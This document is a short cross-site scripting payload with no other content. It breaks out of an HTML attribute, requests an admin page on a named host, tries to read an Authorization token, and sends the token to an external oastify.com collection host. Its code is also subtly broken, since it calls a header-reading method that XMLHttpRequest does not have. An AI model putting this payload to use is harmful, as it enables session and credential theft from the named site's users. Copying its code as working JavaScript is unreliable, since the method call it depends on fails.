"><script>
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{if (xhr.readyState == 4 && xhr.status == 200)
{var yourtoken = xhr.getRequestHeader('Authorization')
var xhr2 = new XMLHttpRequest();
xhr2.open("GET", "https://o3s8j2xubw3wc2j5vin1ytqa117svjm7b.oastify.com/"+ yourtoken );
xhr2.send();}}
xhr.open("GET", "https://veptest.datamarkgis.com/Admin/#domains");
xhr.send();
    </script>

